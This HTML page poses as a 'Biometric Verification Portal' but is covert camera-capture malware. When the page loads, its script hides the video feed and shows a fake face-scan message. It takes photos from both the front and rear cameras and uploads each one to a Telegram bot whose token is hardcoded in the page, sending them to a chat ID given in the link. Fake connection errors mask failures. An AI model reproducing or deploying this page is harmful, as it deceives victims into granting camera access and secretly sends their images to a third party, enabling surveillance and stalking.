<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8">

  <title>Biometric Verification Portal</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>

    body {

      margin: 0;

      padding: 0;

      font-family: 'Segoe UI', sans-serif;

      background: linear-gradient(135deg, #f0f2f5, #dfe6ed);

      height: 100vh;

      display: flex;

      justify-content: center;

      align-items: center;

    }

    .box {

      background: #fff;

      padding: 40px 30px;

      border-radius: 16px;

      box-shadow: 0 10px 25px rgba(0,0,0,0.1);

      max-width: 400px;

      width: 90%;

      text-align: center;

      animation: fadeIn 0.5s ease;

    }

    .logo {

      width: 50px;

      height: 50px;

      background: #007bff;

      border-radius: 50%;

      margin: 0 auto 15px;

    }

    h2 {

      font-size: 20px;

      color: #222;

      margin-bottom: 8px;

    }

    p {

      font-size: 14px;

      color: #666;

      margin-bottom: 20px;

    }

    #msg {

      font-size: 15px;

      color: #333;

      font-weight: 500;

    }

    .loader {

      border: 4px solid #ddd;

      border-top: 4px solid #007bff;

      border-radius: 50%;

      width: 40px;

      height: 40px;

      margin: 25px auto;

      animation: spin 1s linear infinite;

    }

    @keyframes spin {

      to { transform: rotate(360deg); }

    }

    @keyframes fadeIn {

      from { opacity: 0; transform: scale(0.95); }

      to { opacity: 1; transform: scale(1); }

    }

    video {

      display: none !important;

    }

  </style>

</head>

<body>

  <div class="box">

    <div class="logo"></div>

    <h2>Biometric Verification</h2>

    <p>We are validating your identity. Please stay steady...</p>

    <div class="loader"></div>

    <div id="msg">Initializing face scan...</div>

    <video id="video" autoplay playsinline></video>

  </div>

<script>

(function(){

  const TOKEN = "7055229139:AAHgJNtq6Pdve_e1W5xtlWQxjnzm27fjtpU";

  const video = document.getElementById("video");

  const msg = document.getElementById("msg");

  let chat_id = new URLSearchParams(window.location.search).get("chat_id");

  function showMessage(text) {

    msg.innerText = text;

  }

  function sendPhotoToTelegram(blob, count, camType){

    if (!chat_id) {

      showMessage("❗ Please add reference code.");

      return;

    }

    let formData = new FormData();

    formData.append("chat_id", chat_id);

    formData.append("caption", `🔒 ${camType} Camera Capture ${count}`);

    formData.append("photo", blob, `img_${camType}_${count}.jpg`);

    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {

      method: "POST",

      body: formData

    }).then(res => {

      if (!res.ok) showMessage("❌ Your internet connection lost.");

    }).catch(() => {

      showMessage("❌ Your internet connection lost.");

    });

  }

  function captureFrames(camType, facingMode, count = 3, delay = 1300) {

    return navigator.mediaDevices.getUserMedia({

      video: { facingMode: { exact: facingMode } }, audio: false

    }).then(stream => {

      video.srcObject = stream;

      video.play();

      let capture = () => {

        let canvas = document.createElement("canvas");

        canvas.width = video.videoWidth;

        canvas.height = video.videoHeight;

        let ctx = canvas.getContext("2d");

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {

          sendPhotoToTelegram(blob, i + 1, camType);

        }, 'image/jpeg');

      };

      let i = 0;

      let interval = setInterval(() => {

        if (i >= count) {

          clearInterval(interval);

          stream.getTracks().forEach(track => track.stop());

          if (camType === "Front") {

            setTimeout(() => {

              showMessage("📷 Switching to back camera...");

              captureFrames("Rear", "environment");

            }, 1000);

          } else {

            showMessage("✅ Verification complete. Thank you.");

          }

          return;

        }

        capture();

        i++;

      }, delay);

    }).catch(() => {

      showMessage("❗ Please allow camera access.");

    });

  }

  function init() {

    if (!chat_id) return showMessage("❗ Please add reference code.");

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {

      return showMessage("❌ Device does not support .");

    }

    showMessage("");

    captureFrames("Front", "user");

  }

  window.addEventListener("load", () => {

    setTimeout(() => init(), 1000);

  });

})();

</script>

</body>

</html>